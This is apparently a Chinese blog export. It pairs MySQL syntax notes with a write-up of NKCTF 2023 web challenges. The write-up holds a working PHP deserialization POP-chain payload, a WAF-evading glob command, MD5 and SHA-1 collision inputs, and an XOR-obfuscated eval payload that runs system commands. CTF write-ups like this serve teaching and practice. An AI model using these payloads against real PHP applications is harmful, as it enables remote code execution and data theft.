<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a LEFT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| 5           | FK              | NULL           |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>使用right join</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a RIGHT JOIN tcount_tbl b ON a.runoob_author = b.runoob_author;</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| a.runoob_id | a.runoob_author | b.runoob_count |</span><br><span class="line">+-------------+-----------------+----------------+</span><br><span class="line">| 1           | 菜鸟教程    | 10             |</span><br><span class="line">| 2           | 菜鸟教程    | 10             |</span><br><span class="line">| 3           | RUNOOB.COM      | 20             |</span><br><span class="line">| 4           | RUNOOB.COM      | 20             |</span><br><span class="line">| NULL        | NULL            | 22             |</span><br><span class="line">+-------------+-----------------+----------------+</span><br></pre></td></tr></table></figure>

<p>17.null值处理</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">存在一个如下数据库</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| RUNOOB        | 20           |</span><br><span class="line">| 菜鸟教程  | NULL         |</span><br><span class="line">| Google        | NULL         |</span><br><span class="line">| FK            | 20           |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">SELECT * FROM runoob_test_tbl WHERE runoob_count IS NULL;//如果将is null改为=null将无作用</span><br><span class="line">可以返回</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| 菜鸟教程  | NULL         |</span><br><span class="line">| Google        | NULL         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">SELECT * from runoob_test_tbl WHERE runoob_count IS NOT NULL;</span><br><span class="line">可以返回</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| runoob_author | runoob_count |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| RUNOOB        | 20           |</span><br><span class="line">| FK            | 20           |</span><br><span class="line">+---------------+--------------+</span><br></pre></td></tr></table></figure>

<h4 id="18-正则表达式"><a href="#18-正则表达式" class="headerlink" title="18.正则表达式"></a>18.正则表达式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;^st&#x27;;//查找name字段中以&#x27;st&#x27;为开头的所有数据SELECT name FROM person_tbl WHERE name REGEXP &#x27;ok$&#x27;;//查找name字段中以&#x27;ok&#x27;为结尾的所有数据</span><br><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;mar&#x27;;//查找name字段中包含&#x27;mar&#x27;字符串的所有数据</span><br><span class="line">SELECT name FROM person_tbl WHERE name REGEXP &#x27;^[aeiou]|ok$&#x27;;//查找name字段中以元音字符开头或以&#x27;ok&#x27;字符串结尾的所有数据</span><br></pre></td></tr></table></figure>

<h4 id="19-alter命令"><a href="#19-alter命令" class="headerlink" title="19.alter命令"></a>19.alter命令</h4><p>当我们需要修改数据表名或者修改数据表字段时，就需要使用到MySQL ALTER命令</p>
<p><strong>删除，添加或修改表字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop 表中的字段  //是删除该字段的全部内容，如果该表中只有一个字段则无法删除</span><br><span class="line">alter table 表名 add 表中的字段 类型  //是在添加字段并规定其类型</span><br></pre></td></tr></table></figure>

<p>如果要指定新增字段的位置使用FIRST (设定位第一列)， AFTER 字段名（设定位于某个字段之后）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER TABLE 表名 ADD i INT FIRST;//是添加i在表的最前面</span><br><span class="line">ALTER TABLE 表名 ADD i INT AFTER c;//是在c字段后添加i字段</span><br></pre></td></tr></table></figure>

<p><strong>修改字段类型及名称</strong></p>
<p>如果需要修改字段类型及名称, 你可以在ALTER命令中使用 MODIFY 或 CHANGE 子句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把字段 c 的类型从 CHAR(1) 改为 CHAR(10)</span><br><span class="line">alter table 表名 modify c char(10);</span><br><span class="line">在 CHANGE 关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型</span><br><span class="line">alter table 表名 change i 修改的名 类型;</span><br></pre></td></tr></table></figure>

<p><strong>修改Null 值和默认值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 modify j bigint not null default 100;</span><br><span class="line">将j修改为bigint类型并且修改为非空默认值为100</span><br></pre></td></tr></table></figure>

<p><strong>修改字段默认值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 alter i set default 1000;</span><br><span class="line">是将i字段的默认值修改为1000</span><br></pre></td></tr></table></figure>

<h4 id="20-创建临时表"><a href="#20-创建临时表" class="headerlink" title="20.创建临时表"></a><strong>20.创建临时表</strong></h4><p>临时表只在当前连接可见，当关闭连接时，Mysql会自动删除表并释放所有空间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create temporary table 表名(列名 类型);</span><br></pre></td></tr></table></figure>

<p>临时表也可以在mysql会话时删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop table 表名;</span><br></pre></td></tr></table></figure>

<h4 id="21-复制表"><a href="#21-复制表" class="headerlink" title="21.复制表"></a>21.复制表</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 新表 select * from 旧表;</span><br></pre></td></tr></table></figure>

<h4 id="22-select-into语句-无法使用"><a href="#22-select-into语句-无法使用" class="headerlink" title="22.select into语句  (无法使用)"></a>22.select into语句  (<u>无法使用</u>)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * into 表1 from 表2;//是把表2中的数据全都复制到表1中</span><br><span class="line">select 列名1,列名2 into 表1 from 表2;//是把表2中的列名1和列名2复制到表1中</span><br></pre></td></tr></table></figure>

<h4 id="23-元数据"><a href="#23-元数据" class="headerlink" title="23.元数据"></a>23.元数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select version();//可以查看服务器版本信息</span><br><span class="line">select database();//查看当前数据库名</span><br><span class="line">select user();//当前用户名</span><br><span class="line">show columns from 表名;//可以查看表中的字段</span><br></pre></td></tr></table></figure>

<h4 id="24-序列"><a href="#24-序列" class="headerlink" title="24.序列"></a>24.序列</h4><p><strong>使用 AUTO_INCREMENT自增</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table insect (id int unsigned not null auto_increment,primary key (id));</span><br><span class="line">//这是创建insect表，并且规定一个id字段，设置为不允许插入负数(unsigned)，非空(not null)，实现字段自增(auto_increment)，和主键(primary key())</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add id int auto_increment primary key;</span><br><span class="line">可以在已经创建的表上使用AUTO_INCREMENT</span><br></pre></td></tr></table></figure>

<p><strong>设置序列的开始值</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 auto_increment = 100;</span><br><span class="line">//就是把表名的序列开始值设置为100</span><br></pre></td></tr></table></figure>

<p><strong>删除AUTO_INCREMENT</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 change i 修改的名 类型;//可以将AUTO_INCREMENT消除</span><br></pre></td></tr></table></figure>

<h4 id="25-处理重复数据"><a href="#25-处理重复数据" class="headerlink" title="25.处理重复数据"></a>25.处理重复数据</h4><p><strong>防止表中出现重复数据</strong></p>
<p>将指定的字段设置为primary key(主键)或者unique(唯一)来保证数据的唯一性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE person_tbl</span><br><span class="line">(</span><br><span class="line">   first_name CHAR(20) NOT NULL,</span><br><span class="line">   last_name CHAR(20) NOT NULL,</span><br><span class="line">   sex CHAR(10),</span><br><span class="line">   PRIMARY KEY (last_name, first_name)  //创建双主键</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p><strong>统计重复数据</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 列名,count(*) from 表名 group by 列名</span><br><span class="line">//可以根据by后面的列名进行筛选，count(*)是统计改名出现的个数</span><br></pre></td></tr></table></figure>

<h4 id="26-导出数据"><a href="#26-导出数据" class="headerlink" title="26.导出数据"></a>26.导出数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u 用户 -p 密码 runoob_tbl &gt; dump.txt</span><br></pre></td></tr></table></figure>

<h4 id="27-导入数据"><a href="#27-导入数据" class="headerlink" title="27.导入数据"></a>27.导入数据</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -u 用户 -p 密码 runoob_tbl &lt; dump.txt</span><br></pre></td></tr></table></figure>

<h4 id="28-索引"><a href="#28-索引" class="headerlink" title="28.索引"></a>28.索引</h4><p><strong><u>普通索引</u></strong></p>
<p>创建索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一</span><br><span class="line">create index 索引名 on 表名(列名);</span><br><span class="line">二</span><br><span class="line">create table 表名(列名 类型，列名 类型，索引名 (列名));</span><br></pre></td></tr></table></figure>

<p>修改索引(添加索引)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add index 索引名(列名);</span><br></pre></td></tr></table></figure>

<p>删除索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop index 索引名;</span><br><span class="line">drop index 索引名 on 表名;</span><br></pre></td></tr></table></figure>

<p><u><strong>唯一索引</strong></u></p>
<p>索引列的值必须唯一，但允许有空值</p>
<p>创建索引</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一</span><br><span class="line">create unique index 索引名 on 表名(列名);</span><br><span class="line">二</span><br><span class="line">create table 表名(列名 类型，列名 类型，unique 索引名 (列名));</span><br></pre></td></tr></table></figure>

<p><strong>修改索引</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add unique index 索引名(列名);</span><br></pre></td></tr></table></figure>

<p><strong><u>使用alter来添加和删除主键</u></strong></p>
<p>一张表只能有一个主键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add primary key(列名);//建立主键</span><br><span class="line">alter table 表名 drop primary key;//删除主键</span><br></pre></td></tr></table></figure>

<h4 id="29-check约束"><a href="#29-check约束" class="headerlink" title="29.check约束"></a>29.check约束</h4><p><strong>创建表时进行check约束</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table 表名</span><br><span class="line">(</span><br><span class="line">id int,</span><br><span class="line">check (id&gt;0)</span><br><span class="line">)</span><br><span class="line">//这是约束id的值必须大于0</span><br></pre></td></tr></table></figure>

<p><strong>在已经创建的表的列上添加约束</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 add check (id&gt;0);</span><br><span class="line">在id列创建约束</span><br></pre></td></tr></table></figure>

<p><strong>撤销约束</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alter table 表名 drop check</span><br></pre></td></tr></table></figure>

<h4 id="30-事务"><a href="#30-事务" class="headerlink" title="30.事务"></a>30.事务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">begin开始一个事务</span><br><span class="line">rollback事务回滚</span><br><span class="line">commit事务确认</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2023 nkctf的web部分解题</title>
    <url>/2023/03/29/nkctf%20web/</url>
    <content><![CDATA[<p>反序列化和绕过强，弱比较</p>
<span id="more"></span>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>1.首先是源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&#x27;ItS SO CREAZY&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">        <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>有unserialize()函数，一看就是一个反序列化，还有__destruct()函数，使用反序列化函数时会自动调用这个函数</p>
<p>2.这道题的pop链逻辑比较简单，使用的魔术方法也比较少</p>
<p>直接来构造pop链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize() =&gt; __destruct() -&gt; $arg =&gt; __toString() -&gt; $func =&gt; __invoke() -&gt; eval($shell($cmd))</span><br></pre></td></tr></table></figure>

<p>直接上payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;welcome_to_NKCTF&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;more /[e-h][k-m][0-b][e-h]&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$we</span>=<span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$ha</span>=<span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$ho</span>=<span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$we</span>-&gt;arg=<span class="variable">$ho</span>;</span><br><span class="line"><span class="variable">$we</span>-&gt;arg-&gt;func=<span class="variable">$ha</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$we</span>));</span><br></pre></td></tr></table></figure>

<p>3.这里主要的难点是一个正则匹配</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个正则匹配的意思是匹配f，l，a，g，*，?这几个字符，并且不区分大小写，</p>
<p>读取flag文件，通常会使用cat，但是cat中含有a字符，可以用more来代替cat</p>
<p>接下来就是考虑可以用什么来代替flag，这里看wp知道glob通配符</p>
<p>看ascii码表，f位于e和h之间，l位于k和m之间，a可以当成在0和b之间，g在e和h之间</p>
<p><img src="/2023/03/29/nkctf%20web/image-20230403210845208.png" alt="image-20230403210845208"></p>
<p>所以flag可以使用<code>[e-h][k-m][0-b][e-h]</code>来代替</p>
<h2 id="绕过强，弱比较"><a href="#绕过强，弱比较" class="headerlink" title="绕过强，弱比较"></a>绕过强，弱比较</h2><p>1.上源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span>)&#123;</span><br><span class="line"><span class="comment">//            phpinfo();</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//                phpinfo();</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!!&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;error!!!!!&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;error!!!!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;error!!!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里有很多匹配，需要将这些匹配全部都绕过，才能达到<code>eval($_POST[&#39;cmd&#39;]);</code>命令</p>
<p>2.先看第一个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>这个可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=s1885207154a&amp;b=s1836677006a</span><br></pre></td></tr></table></figure>

<p>这两个数值经过md5加密后，都是以0e开头的，以0e开头的数都等于0</p>
<p>第二个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>] != (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;d&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>这个通过搜到资料找到可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</span><br></pre></td></tr></table></figure>

<p>第三个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>] != <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;e&#x27;</span>]) == <span class="number">114514</span></span><br></pre></td></tr></table></figure>

<p>intval()函数是获取变量的整数值</p>
<p>可以使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e=114514E13</span><br></pre></td></tr></table></figure>

<p>intval()函数不会读取E后面的值，经过intval()函数处理后就等于114514</p>
<p>第四个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NS_CTF.go&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>需要存在NS_CTF.go，但是传入的参数名中点<code>.</code>和<code>空格</code>都被替换为了下划线<code>_</code></p>
<p>所以直接传参NS_CTF.go并不能行</p>
<p>搜索发现当<code>PHP版本小于8</code>时，如果参数中出现中括号<code>[</code>，中括号会被转换成下划线<code>_</code>，然后因为出错，点<code>.</code>就不会变成下划线<code>_</code></p>
<p>第五个</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-zA-Z]/i&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>不能存在数字和字母</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;);$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;);$___=$$__;$_($___[_]);&amp;_=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>以下摆出能生成异或查询脚本</p>
